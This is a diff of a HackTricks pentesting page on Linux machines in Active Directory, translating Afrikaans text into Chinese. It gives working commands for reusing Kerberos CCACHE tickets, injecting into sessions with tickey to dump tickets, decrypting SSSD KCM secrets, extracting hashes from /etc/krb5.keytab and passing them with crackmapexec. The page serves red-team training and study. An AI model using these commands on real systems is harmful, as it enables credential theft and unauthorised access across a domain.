@@ -1,33 +1,33 @@
 # Linux Active Directory
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术： <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
 {% embed url="https://websec.nl/" %}
 
-'n Linux masjien kan ook teenwoordig wees binne 'n Active Directory omgewing.
+Linux 机器也可以存在于 Active Directory 环境中。
 
-'n Linux masjien in 'n AD mag **verskillende CCACHE kaartjies binne lêers stoor. Hierdie kaartjies kan gebruik en misbruik word soos enige ander kerberos kaartjie**. Om hierdie kaartjies te lees, moet jy die gebruiker-eienaar van die kaartjie wees of **root** binne die masjien.
+在 AD 中的 Linux 机器可能会 **在文件中存储不同的 CCACHE 票证。这些票证可以像其他任何 Kerberos 票证一样被使用和滥用**。要读取这些票证，您需要是票证的用户所有者或 **root** 用户。
 
-## Enumerasie
+## 枚举
 
-### AD enumerasie vanaf linux
+### 从 Linux 进行 AD 枚举
 
-As jy toegang het oor 'n AD in linux (of bash in Windows) kan jy probeer [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) om die AD te enumerate.
+如果您在 Linux（或 Windows 中的 bash）上访问 AD，您可以尝试 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) 来枚举 AD。
 
-Jy kan ook die volgende bladsy nagaan om te leer **ander maniere om AD vanaf linux te enumerate**:
+您还可以查看以下页面以了解 **从 Linux 枚举 AD 的其他方法**：
 
 {% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
 [pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
@@ -35,27 +35,27 @@ Jy kan ook die volgende bladsy nagaan om te leer **ander maniere om AD vanaf lin
 
 ### FreeIPA
 
-FreeIPA is 'n oopbron **alternatief** vir Microsoft Windows **Active Directory**, hoofsaaklik vir **Unix** omgewings. Dit kombineer 'n volledige **LDAP gids** met 'n MIT **Kerberos** Sleutelverspreidingsentrum vir bestuur soortgelyk aan Active Directory. Dit gebruik die Dogtag **Sertifikaatstelsel** vir CA & RA sertifikaatbestuur, en ondersteun **multi-faktor** verifikasie, insluitend slimkaarte. SSSD is geïntegreer vir Unix verifikasieprosesse. Leer meer daaroor in:
+FreeIPA 是 Microsoft Windows **Active Directory** 的开源 **替代品**，主要用于 **Unix** 环境。它结合了完整的 **LDAP 目录** 和 MIT **Kerberos** 密钥分发中心，管理方式类似于 Active Directory。利用 Dogtag **证书系统** 进行 CA 和 RA 证书管理，支持 **多因素** 身份验证，包括智能卡。集成了 SSSD 以支持 Unix 身份验证过程。了解更多信息：
 
 {% content-ref url="../freeipa-pentesting.md" %}
 [freeipa-pentesting.md](../freeipa-pentesting.md)
 {% endcontent-ref %}
 
-## Speel met kaartjies
+## 操作票证
 
 ### Pass The Ticket
 
-Op hierdie bladsy gaan jy verskillende plekke vind waar jy **kerberos kaartjies binne 'n linux gasheer kan vind**, op die volgende bladsy kan jy leer hoe om hierdie CCache kaartjie formate na Kirbi (die formaat wat jy in Windows moet gebruik) te transformeer en ook hoe om 'n PTT aanval uit te voer:
+在此页面中，您将找到不同的地方，您可以 **在 Linux 主机中找到 Kerberos 票证**，在以下页面中，您可以了解如何将这些 CCache 票证格式转换为 Kirbi（您在 Windows 中需要使用的格式），以及如何执行 PTT 攻击：
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
 [pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
 {% endcontent-ref %}
 
-### CCACHE kaartjie hergebruik vanaf /tmp
+### 从 /tmp 重用 CCACHE 票证
 
-CCACHE lêers is binêre formate vir **storing Kerberos akrediteer** en word tipies gestoor met 600 toestemmings in `/tmp`. Hierdie lêers kan geïdentifiseer word deur hul **naamformaat, `krb5cc_%{uid}`,** wat ooreenstem met die gebruiker se UID. Vir verifikasie van die verifikasieticket, moet die **omgewing veranderlike `KRB5CCNAME`** op die pad van die gewenste kaartjie lêer gestel word, wat hergebruik moontlik maak.
+CCACHE 文件是用于 **存储 Kerberos 凭据** 的二进制格式，通常以 600 权限存储在 `/tmp` 中。这些文件可以通过其 **名称格式 `krb5cc_%{uid}`** 进行识别，与用户的 UID 相关联。要验证身份验证票证，**环境变量 `KRB5CCNAME`** 应设置为所需票证文件的路径，以便重用。
 
-Lys die huidige kaartjie wat vir verifikasie gebruik word met `env | grep KRB5CCNAME`. Die formaat is draagbaar en die kaartjie kan **hergebruik word deur die omgewing veranderlike** met `export KRB5CCNAME=/tmp/ticket.ccache` te stel. Kerberos kaartjie naamformaat is `krb5cc_%{uid}` waar uid die gebruiker se UID is.
+使用 `env | grep KRB5CCNAME` 列出当前用于身份验证的票证。该格式是可移植的，票证可以通过使用 `export KRB5CCNAME=/tmp/ticket.ccache` 设置环境变量来 **重用**。Kerberos 票证名称格式为 `krb5cc_%{uid}`，其中 uid 是用户 UID。
 ```bash
 # Find tickets
 ls /tmp/ | grep krb5cc
@@ -64,59 +64,59 @@ krb5cc_1000
 # Prepare to use it
 export KRB5CCNAME=/tmp/krb5cc_1000
 ```
-### CCACHE kaart hergebruik vanaf sleutelring
+### CCACHE 票据重用来自密钥环
 
-**Kerberos-kaarte wat in 'n proses se geheue gestoor is, kan onttrek word**, veral wanneer die masjien se ptrace-beskerming gedeaktiveer is (`/proc/sys/kernel/yama/ptrace_scope`). 'n Nuttige hulpmiddel vir hierdie doel is te vind by [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), wat die onttrekking vergemaklik deur in sessies in te spuit en kaarte in `/tmp` te dump.
+**存储在进程内存中的 Kerberos 票据可以被提取**，特别是在机器的 ptrace 保护被禁用时（`/proc/sys/kernel/yama/ptrace_scope`）。一个有用的工具可以在 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) 找到，它通过注入会话并将票据转储到 `/tmp` 来方便提取。
 
-Om hierdie hulpmiddel te konfigureer en te gebruik, word die onderstaande stappe gevolg:
+要配置和使用此工具，请按照以下步骤进行：
 ```bash
 git clone https://github.com/TarlogicSecurity/tickey
 cd tickey/tickey
 make CONF=Release
 /tmp/tickey -i
 ```
-Hierdie prosedure sal probeer om in verskeie sessies in te spuit, wat sukses aandui deur onttrokken kaartjies in `/tmp` te stoor met 'n naamkonvensie van `__krb_UID.ccache`.
+此过程将尝试注入到各种会话中，通过将提取的票证存储在 `/tmp` 中，命名约定为 `__krb_UID.ccache` 来指示成功。
 
-### CCACHE kaartjie hergebruik van SSSD KCM
+### 来自SSSD KCM的CCACHE票证重用
 
-SSSD hou 'n kopie van die databasis by die pad `/var/lib/sss/secrets/secrets.ldb`. Die ooreenstemmende sleutel word as 'n verborge lêer by die pad `/var/lib/sss/secrets/.secrets.mkey` gestoor. Standaard is die sleutel slegs leesbaar as jy **root** regte het.
+SSSD在路径 `/var/lib/sss/secrets/secrets.ldb` 处维护数据库的副本。相应的密钥存储为隐藏文件，路径为 `/var/lib/sss/secrets/.secrets.mkey`。默认情况下，只有在您具有 **root** 权限时，才能读取该密钥。
 
-Die **`SSSDKCMExtractor`** met die --database en --key parameters sal die databasis ontleed en **die geheime** dekripteer.
+使用 **`SSSDKCMExtractor`** 及其 --database 和 --key 参数将解析数据库并 **解密秘密**。
 ```bash
 git clone https://github.com/fireeye/SSSDKCMExtractor
 python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
 ```
-Die **akkrediteringskas Kerberos blob kan in 'n bruikbare Kerberos CCache** lêer omgeskakel word wat aan Mimikatz/Rubeus oorgedra kan word.
+**凭证缓存 Kerberos blob 可以转换为可用的 Kerberos CCache** 文件，可以传递给 Mimikatz/Rubeus。
 
-### CCACHE kaartjie hergebruik vanaf keytab
+### 从 keytab 重用 CCACHE 票证
 ```bash
 git clone https://github.com/its-a-feature/KeytabParser
 python KeytabParser.py /etc/krb5.keytab
 klist -k /etc/krb5.keytab
 ```
-### Trek rekeninge uit /etc/krb5.keytab
+### 从 /etc/krb5.keytab 提取账户
 
-Diensrekening sleutels, wat noodsaaklik is vir dienste wat met wortelprivileges werk, word veilig gestoor in **`/etc/krb5.keytab`** lêers. Hierdie sleutels, soortgelyk aan wagwoorde vir dienste, vereis streng vertroulikheid.
+服务账户密钥，对于以 root 权限运行的服务至关重要，安全地存储在 **`/etc/krb5.keytab`** 文件中。这些密钥类似于服务的密码，要求严格保密。
 
-Om die inhoud van die keytab-lêer te ondersoek, kan **`klist`** gebruik word. Die hulpmiddel is ontwerp om sleuteldetails te vertoon, insluitend die **NT Hash** vir gebruikersverifikasie, veral wanneer die sleuteltipe as 23 geïdentifiseer word.
+要检查 keytab 文件的内容，可以使用 **`klist`**。该工具旨在显示密钥详细信息，包括用户身份验证的 **NT Hash**，特别是当密钥类型被识别为 23 时。
 ```bash
 klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
 # Output includes service principal details and the NT Hash
 ```
-Vir Linux gebruikers bied **`KeyTabExtract`** funksionaliteit om die RC4 HMAC-has te onttrek, wat benut kan word vir NTLM-has hergebruik.
+对于Linux用户，**`KeyTabExtract`** 提供了提取RC4 HMAC哈希的功能，这可以用于NTLM哈希重用。
 ```bash
 python3 keytabextract.py krb5.keytab
 # Expected output varies based on hash availability
 ```
-Op macOS dien **`bifrost`** as 'n hulpmiddel vir sleuteltabelfilaanalyse.
+在 macOS 上，**`bifrost`** 作为一个工具用于 keytab 文件分析。
 ```bash
 ./bifrost -action dump -source keytab -path /path/to/your/file
 ```
-Met die onttrokken rekening- en hash-inligting kan verbindings met bedieners gevestig word met behulp van gereedskap soos **`crackmapexec`**.
+利用提取的账户和哈希信息，可以使用工具如 **`crackmapexec`** 建立与服务器的连接。
 ```bash
 crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
 ```
-## Verwysings
+## 参考文献
 
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 * [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
@@ -125,16 +125,16 @@ crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDO
 {% embed url="https://websec.nl/" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
